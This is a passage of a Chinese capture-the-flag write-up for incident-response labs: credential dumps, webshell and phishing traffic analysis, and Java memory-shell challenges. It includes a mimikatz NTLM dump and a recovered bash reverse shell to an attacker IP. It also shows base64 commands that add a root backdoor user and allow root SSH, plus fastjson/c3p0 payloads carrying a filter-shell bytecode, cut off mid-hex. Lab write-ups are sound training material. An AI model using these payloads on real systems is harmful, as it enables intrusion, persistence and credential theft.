         * Password : 4a 0f d8 eb ab 65 d8 c8 98 97 8c f2 d6 c2 f1 30 e0 7c 75 00 ac 04 0d 24 26 96 8c 84 68 6a c5 72 86 24 f2 96 b8 e4 f8 d6 1e 91 97 9d 1c aa b3 7b 98 b5 ea 15 9f cb 44 4d 7b 3e 7e 65 c9 29 64 3d bb aa f0 aa 1b d0 52 02 ba 4e e8 73 d5 f2 2c 1b bf 40 03 a8 d2 47 23 c8 aa f1 fc ba d8 fa 84 e4 81 59 1b 3c 3d f3 d4 10 f6 47 d2 38 f8 f9 b0 53 e3 0a 34 2c ba 19 a4 ba 14 62 ce 9c 69 d5 e2 14 d1 e1 be a3 bc c9 41 25 78 ab 6d c2 8c 4f 1e 8e ec d8 7c 1c 92 28 53 bd 5c 7c db d1 d1 da 5e 47 28 0d 96 2c 9e b4 37 a1 44 3c 65 64 20 d5 ac cd c3 e7 db 6d 7d 58 79 16 14 9e 93 e4 39 5a 53 59 79 10 66 ae 6c 9e cc 77 32 f1 e4 1b 5f d8 9c c6 aa 71 5c 60 11 84 7a 8d 0e 2e c4 52 6a 58 26 89 90 c0 9c cf cb a1 ae 11 f1 24 1d 78 a8 d5 ef df
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 47512 (00000000:0000b998)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:09
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : WIN10$
         * Domain   : VULNTARGET
         * NTLM     : 005bfe6deb871c027d2423009396909f
         * SHA1     : 13cd32ae0fe6a42b23e6a7def795b2769ee078f8
        tspkg :
        wdigest :
         * Username : WIN10$
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : WIN10$
         * Domain   : vulntarget.com
         * Password : 4a 0f d8 eb ab 65 d8 c8 98 97 8c f2 d6 c2 f1 30 e0 7c 75 00 ac 04 0d 24 26 96 8c 84 68 6a c5 72 86 24 f2 96 b8 e4 f8 d6 1e 91 97 9d 1c aa b3 7b 98 b5 ea 15 9f cb 44 4d 7b 3e 7e 65 c9 29 64 3d bb aa f0 aa 1b d0 52 02 ba 4e e8 73 d5 f2 2c 1b bf 40 03 a8 d2 47 23 c8 aa f1 fc ba d8 fa 84 e4 81 59 1b 3c 3d f3 d4 10 f6 47 d2 38 f8 f9 b0 53 e3 0a 34 2c ba 19 a4 ba 14 62 ce 9c 69 d5 e2 14 d1 e1 be a3 bc c9 41 25 78 ab 6d c2 8c 4f 1e 8e ec d8 7c 1c 92 28 53 bd 5c 7c db d1 d1 da 5e 47 28 0d 96 2c 9e b4 37 a1 44 3c 65 64 20 d5 ac cd c3 e7 db 6d 7d 58 79 16 14 9e 93 e4 39 5a 53 59 79 10 66 ae 6c 9e cc 77 32 f1 e4 1b 5f d8 9c c6 aa 71 5c 60 11 84 7a 8d 0e 2e c4 52 6a 58 26 89 90 c0 9c cf cb a1 ae 11 f1 24 1d 78 a8 d5 ef df
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46559 (00000000:0000b5df)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:07
SID               :
        msv :
         [00000003] Primary
         * Username : WIN10$
         * Domain   : VULNTARGET
         * NTLM     : 005bfe6deb871c027d2423009396909f
         * SHA1     : 13cd32ae0fe6a42b23e6a7def795b2769ee078f8
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN10$
Domain            : VULNTARGET
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:07
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WIN10$
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : win10$
         * Domain   : VULNTARGET.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162848655.png)


拿到NTLM直接解密一下

```
flag{admin#123}
```

# 第六章 流量特征分析-蚁剑流量分析

1.木马的连接密码是多少
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162858605.png)

传的是1=

```
flag{1}
```

2.黑客执行的第一个命令是什么

解一下流量，可以得到下面命令

```
cd "/var/www/html";id;echo e124bc;pwd;echo 43523
cd "/var/www/html";ls;echo e124bc;pwd;echo 43523
cd "/var/www/html";cat /etc/passwd;echo e124bc;pwd;echo 43523
cd "/var/www/html";id;echo e124bc;pwd;echo 43523
```

应该是id这个，其他都是蚁剑的命令

```
flag{id}
```

3.黑客读取了哪个文件的内容，提交文件绝对路径

```
cd "/var/www/html";cat /etc/passwd;echo e124bc;pwd;echo 43523
flag{/etc/passwd}
```

4.黑客上传了什么文件到服务器，提交文件名

跟踪一下流量可以看到传了个flag.txt

```
flag{flag.txt}
```

5.黑客上传的文件内容是什么
找到对应的流看一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162912891.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162916758.png)

盲猜是文件内容
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162923558.png)

```
flag{write_flag}
```

黑客下载了哪个文件，提交文件绝对路径
跟踪一下流量解密一下发现是下载了config.php

```
flag{/var/www/html/config.php}
```

# 第六章 流量特征分析-waf 上的截获的黑客攻击流量

1.黑客成功登录系统的密码 flag{xxxxxxxxxxxxxxx}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162934646.png)

```
flag{admin!@#pass123}
```

2.黑客发现的关键字符串 flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
搜flag即可
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162943267.png)

```
flag{87b7cb79481f317bde90c116cf36084b}
```

3.黑客找到的数据库密码 flag{xxxxxxxxxxxxxxxx}
搜database即可
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162954923.png)

```
flag{e667jUPvJjXHvEUv}
```

# 第六章 流量特征分析-常见攻击事件 tomcat

1、在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP flag格式：flag{ip}，如：flag{127.0.0.1}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163004119.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163007198.png)

```
flag{14.0.0.120}
```

2、找到攻击者IP后请通过技术手段确定其所在地址 flag格式: flag{城市英文小写}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163016693.png)

```
flag{guangzhou}
```

3、哪一个端口提供对web服务器管理面板的访问？ flag格式：flag{2222}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163028194.png)

```
flag{8080}
```

4、经过前面对攻击者行为的分析后,攻击者运用的工具是？ flag格式：flag{名称}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163036570.png)

```
ip.addr==14.0.0.120&&http
```

多翻几个数据包可以找到user-agent里面有工具名

```
flag{gobuster}
```

5、攻击者拿到特定目录的线索后,想要通过暴力破解的方式登录,请通过分析流量找到攻击者登录成功的用户名和密码？ flag格式：flag{root-123}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163054362.png)

```
flag{admin-tomcat}
```

6、攻击者登录成功后,先要建立反弹shell,请分析流量提交恶意文件的名称？ flag格式：flag{114514.txt}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163103381.png)

就是传war 包的打法

```
flag{JXQOZY.war}
```

7、攻击者想要维持提权成功后的登录,请分析流量后提交关键的信息？ flag提示,某种任务里的信息
可以猜测是反弹shell有关
搜一下/bin，这里是写定时任务了
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163111652.png)

```
flag{/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'}
```

# 第六章 流量特征分析-小王公司收到的钓鱼邮件

下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx/w0ks//?YO=xxxxxxx}） (无需 http、https)；
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163126373.png)

```
flag{tsdandassociates.co.sz/w0ks//?YO=1702920835}
```

下载数据包文件 hacker1.pacapng，分析获取到的 zip 压缩包的 MD5 是什么 作为 FLAG 提交 FLAG（形式：flag{md5}）；
导出http对象
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163135511.png)

改为压缩包
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163140965.png)

```
flag{f17dc5b1c30c512137e62993d1df9b2f}
```

下载数据包文件 hacker1.pacapng，分析 zip 压缩包通过加载其中的 javascript 文件到另一个域名下载后续恶意程序， 该域名是什么?提交答案:flag{域名}(无需 http、https)
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163150347.png)

把注释替换掉
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163156060.png)
在下面竖着看，看到http，直接打印出来

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163202052.png)

```
flag{shakyastatuestrade.com}
```

# 第七章 常见攻击事件分析--钓鱼邮件

请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag{11.22.33.44}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163214196.png)

```
flag{121.204.224.15}
```

请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag{11.22.33.44}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163221865.png)

```
flag{107.16.111.57}
```

黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag{/var/www/html/shell.php}
d盾扫一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163229250.png)
看一下文件，可以确认是webshell

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163235668.png)

```
flag{/var/www/html/admin/ebak/ReData.php}
```

flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag{/opt/apache2/shell}
看这个配置文件与代理配置文件类似，可以猜测这个mysql为代理文件
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163246467.png)

```
flag{/var/tmp/proc/mysql}
```

# **第八章 内存马分析-java01-nacos**

问题 1 nacos 用户密码的密文值作为 flag 提交 flag{密文}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163255914.png)

拿下jar包解压
在sql里面找到了

```
flag{$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu}
```

问题 2 shiro 的key为多少 shiro 的 key 请记录下来 （备注请记录下，可能有用）
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163312994.png)

```
flag{KduO0i+zUIMcNNJnsZwU9Q==}
```

问题 3 靶机内核版本为 flag{}

```
flag{5.4.0-164-generic}
```

问题 4 尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag

问题 5 尝试修复 nacos 并且自行用 poc 测试是否成功

# 第八章 内存马分析-java02-shiro

可以参考下面文章
[【永久开源】vulntarget-m-攻防应急靶场write up](https://mp.weixin.qq.com/s/YxZqgd6Hjz3QcYCPAGpAGg)
1.将 shiro 的 key 作为 flag 提交
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163328458.png)

fscan扫一下
知道是8088端口
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163336348.png)

拿上题的key 成功了

```
flag{KduO0i+zUIMcNNJnsZwU9Q==}
```

2.隐藏用户后删除，并将隐藏用户名作为 flag 提交
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163348360.png)

```
flag{guest}
```

3.分析app.jar文件是否存在后门，并把后门路由名称作为 flag 提交 <flag{/manager}>
能rce，但ssh不了，解决一下

```
ssh新建用户：
echo "system:adk6oNRwypFwA:0:0:eval_to_root:/root:/bin/bash" >> /etc/passwd
账号：system 密码：admin123
#!/bin/bash

echo "system:adk6oNRwypFwA:0:0:eval_to_root:/root:/bin/bash" >> /etc/passwd
```

执行下面这个

```
echo ZWNobyAnIyEvYmluL2Jhc2gNCg0KZWNobyAic3lzdGVtOmFkazZvTlJ3eXBGd0E6MDowOmV2YWxfdG9fcm9vdDovcm9vdDovYmluL2Jhc2giID4+IC9ldGMvcGFzc3dkJyA+IGEuc2g=|base64 -d >a.sh
chmod 777 a.sh
bash ./a.sh
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
重启
/etc/init.d/ssh restart
```

用下面这个

```
echo IyEvYmluL2Jhc2gNCg0KZWNobyAiUGVybWl0Um9vdExvZ2luIHllcyIgPj4gL2V0Yy9zc2gvc3NoZF9jb25maWc= |base64 -d >b.sh
chmod 777 b.sh
bash ./b.sh
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163402044.png)

重启ssh

```
/etc/init.d/ssh restart
```

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163417731.png)

用

```
system/admin123
```

可以登录，拿下jar包
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163428699.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163435462.png)

看一下shiro路由

```
flag{/exec}
```

4.分析app.jar文件，将后门的密码作为 flag 提交
看拿下的是什么参数就可以了
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163445087.png)

flag{cmd}

# **第八章 内存马分析-java03-fastjson**

其实就是打一遍

1. fastjson版本作为 flag 提交 flag{x.x.66}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163456714.png)

```
{
 "\u0040\u0074\u0079\u0070\u0065": "java.lang.AutoCloseable"
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163507917.png)

```
flag{1.2.47}
```

1. 内核版本作为 flag 提交 flag{Dexxxxxxxxxux}
   c3p0+fastjson直接打
   ![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710163518041.png)

```
{
    "a":{
        "\u0040\u0074\u0079\u0070\u0065":"java.lang.Class",
        "val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    },
    "b":{
        "\u0040\u0074\u0079\u0070\u0065":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        "\u0075\u0073\u0065\u0072\u004f\u0076\u0065\u0072\u0072\u0069\u0064\u0065\u0073\u0041\u0073\u0053\u0074\u0072\u0069\u006e\u0067":"HexAsciiSerializedMap:aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d657400124c6a6176612f6c616e672f537472696e673b4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e002000078700000254acafebabe0000003401880a005e00cc0800cd09004b00ce0700cf0700d00b000400d10700d20a000700cc08007f0b004900d308007b08007d0a00d400d50a00d400d60b000400d70800d80a00d900da0a002400db0a001c00dc0a001c00dd0800de0a004b00df0b00e000e10a00e200e30800e40a00e500e60800e70700e80700a40900e900ea0a001c00eb0a00ec00ed0800ee0a002700ef0700f00700f10a00e900f20a00ec00f30700f40a001c00f50a00f600ed0a001c00f70a00f600f80800f908009d0b00fa00fb0800fc0a00fd00fe0700ff0a00d901000a003101010a00fd01020701030a003500cc0b000401040a010501060a003501070a00fd01080a001c010908010a07010b08010c07010d0a003f010e0b010f01100701110801120a001c01130800c90a001c01140a011500ed0a011501160701170b004901160701180a004b00cc0701190a004d00cc0a004d011a0a004d011b0a004d011c0a0042011d07011e0a005300cc08011f0a005301200a0053011b09012101220a012101230a005301240a0042012507012607012707012807012901000270610100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000a4c4963655368656c6c3b010004696e697401001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e7307012a0100104d6574686f64506172616d6574657273010008646f46696c74657201005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b29560100064c636c6173730100114c6a6176612f6c616e672f436c6173733b01000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b010007726571756573740100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b010008726573706f6e73650100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b01000773657373696f6e0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b0100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507011807012b07012c07012d0700cf0700d007012e0701170700f40700e807012f01000764657374726f79010009527573685468657265010081284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703b295601000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b010001750100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c61737342797465730100025b4201000665636c617373010001610100016201000862797465636f64650701300700f007010b0100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701310100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b0100046e616d65010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d66696c746572436f6e6669677301000a536f7572636546696c6501000d4963655368656c6c2e6a6176610c00630064010010336164326664646665386261643865360c006000610100256a617661782f736572766c65742f687474702f48747470536572766c6574526571756573740100266a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73650c013201330100116a6176612f7574696c2f486173684d61700c013401350701360c013701380c0139013a0c013b013c010004504f535407013d0c010a013e0c013f01400c014101400c0142013c0100156a6176612e6c616e672e436c6173734c6f616465720c0094009507012d0c007101430701440c0145014801026479763636766741414144514147676f41424141554367414541425548414259484142634241415938615735706444344241426f6f54477068646d4576624746755a7939446247467a633078765957526c636a73705667454142454e765a4755424141394d6157356c546e5674596d5679564746696247554241424a4d62324e6862465a68636d6c68596d786c56474669624755424141523061476c7a415141445446553741514142597745414630787159585a684c327868626d63765132786863334e4d6232466b5a584937415141425a7745414653686251696c4d616d4632595339735957356e4c304e7359584e7a4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540701490c014a014b01000b646566696e65436c61737301000f6a6176612f6c616e672f436c61737307014c0c014d00740c014e014f0701300c01500151010001550c015201530100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0100106a6176612f6c616e672f4f626a6563740c015401550c015601570100156a6176612f6c616e672f436c6173734c6f616465720c0158015907015a0c015b013a0c015c015d0100016707012e0c015e015f0100034145530701600c0161016201001f6a617661782f63727970746f2f737065632f5365637265744b6579537065630c016301640c006301650c006a016601001673756e2f6d6973632f4241534536344465636f6465720c016701680701690c016a013c0c016b014b0c016c016d0c015c016e010006657175616c730100136a6176612f6c616e672f457863657074696f6e01000c4175746f6d6e6547726565740100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c016f01700701710c017201730100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c017401530c017501760701770c0178017901000d6a6176612f7574696c2f4d61700100084963655368656c6c01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c017a017b0c017c017d0c017e017d0c017f018001002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100062f7368656c6c0c0181017d0701820c018301840c00c2013c0c0185017d0c018601870100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701001b6f72672f6170616368652f636174616c696e612f436f6e74657874010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e01001e6a617661782f736572766c65742f687474702f4874747053657373696f6e0100136a6176612f696f2f494f457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f537472696e67010015284c6a6176612f6c616e672f4f626a6563743b295a010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000d6765745375706572636c6173730100076765744e616d65010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f7574696c2f42617365363401000a6765744465636f6465720100074465636f64657201000c496e6e6572436c617373657301001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420100116a6176612f6c616e672f496e7465676572010004545950450100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a29560100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000e676574436c6173734c6f6164657201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b010008676574427974657301000428295b42010017285b424c6a6176612f6c616e672f537472696e673b295601001728494c6a6176612f73656375726974792f4b65793b295601000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e6501000c6465636f6465427566666572010007646f46696e616c010006285b42295b4201001428294c6a6176612f6c616e672f4f626a6563743b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d650100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c64010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b295601000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560021004b005e0001005f0001001200600061000100620000000200020008000100630064000100650000003d000200010000000b2ab700012a1202b50003b10000000200660000000e00030000002900040027000a002a00670000000c00010000000b0068006900000001006a006b00030065000000350000000200000001b10000000200660000000600010000002d00670000001600020000000100680069000000000001006c006d0001006e000000040001006f00700000000501006c000000010071007200030065000003180006000a000001ab2bc000043a042cc000053a051904b9000601003a06bb000759b700083a07190712091906b9000a0300571907120b1904b9000a0300571907120c1905b9000a030057b8000db6000e3a081904b9000f01001210b600119901541908b60012b60013b600141215b6001199001e1908b60012b600133a092a19091908190619041907b60016a7011e1908b60012b60013b60013b600141215b600119900211908b60012b60013b600133a092a19091908190619041907b60016a700ea1908b60012b60013b60013b60013b600141215b600119900241908b60012b60013b60013b600133a092a19091908190619041907b60016a700b01908b60012b60013b60013b60013b60013b600141215b600119900271908b60012b60013b60013b60013b600133a092a19091908190619041907b60016a700701908b60012b60013b60013b60013b60013b60013b600141215b6001199002a1908b60012b60013b60013b60013b60013b600133a092a19091908190619041907b60016a7002a1908b60012b60013b60013b60013b60013b60013b600133a092a19091908190619041907b600162d2b2cb900170300b100000004006600000072001c0000003000060031000c003200150033001e0034002a00350036003600420037004a00380059003a006c003b0076003c0087003d009d003e00aa003f00bb004000d4004100e4004200f5004301110044012400450135004601540047016a0048017b004a0194004b01a2004e01aa00510